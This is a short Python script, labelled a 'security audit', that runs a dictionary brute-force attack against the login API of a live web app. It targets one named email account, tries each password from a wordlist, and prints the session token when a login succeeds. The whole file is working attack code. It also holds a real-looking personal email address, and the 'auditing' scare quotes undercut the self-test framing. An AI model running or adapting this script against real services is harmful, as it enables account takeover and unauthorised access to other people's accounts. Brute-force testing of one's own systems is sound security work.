import requests
import time

# --- CONFIGURATION ---
# Use your live Render API link
login_url = "https://animua.onrender.com/api/auth/login"
target_email = "yanapangan@gmail.com"  # The account you are "auditing"

# Load the password dictionary
try:
    with open("passwords.txt", "r") as file:
        passwords = file.read().splitlines()
except FileNotFoundError:
    print("Error: passwords.txt not found!")
    passwords = []

print(f"--- ANIMUA Security Audit: Brute Force Test ---")
print(f"Target: {target_email}\n")

for password in passwords:
    # Prepare the JSON payload your Express server expects
    payload = {
        "email": target_email,
        "password": password
    }

    start = time.time()
    
    try:
        # Send the POST request to the API
        response = requests.post(login_url, json=payload, timeout=10)
        end = time.time()
        elapsed = round(end - start, 2)

        print(f"Testing: {password}")
        print(f"Status: {response.status_code}") # 401 = Unauthorized, 200 = Success
        print(f"Latency: {elapsed}s")
        print("-" * 30)

        # Success detection for your JWT response
        if response.status_code == 200:
            print(f"\n[!] ALERT: Weak Password Found: {password}")
            print(f"JWT Token Received: {response.json().get('token')[:20]}...")
            break
            
    except Exception as e:
        print(f"Connection Error: {e}")
        break

print("\nAudit Complete.")